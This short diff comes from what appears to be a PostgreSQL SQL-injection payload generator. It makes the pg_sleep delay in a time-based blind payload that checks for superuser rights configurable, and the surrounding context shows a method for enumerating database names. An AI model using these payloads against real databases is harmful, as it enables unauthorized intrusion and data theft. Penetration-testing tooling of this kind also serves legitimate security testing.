@@ -30,7 +30,7 @@ class PostgresPayloadGenerator:
 
     def superuser_check_payload(self) -> str:
         """Generate payload to check if current user is superuser"""
-        return f'SELECT case when (SELECT current_setting("is_superuser"))="on" then pg_sleep(10) end;--'
+        return f'SELECT case when (SELECT current_setting("is_superuser"))="on" then pg_sleep({self.sleep_time}) end;--'
 
     def database_enum_payload(self, char_pos: int, char: str) -> str:
         """Generate payload to enumerate database names"""
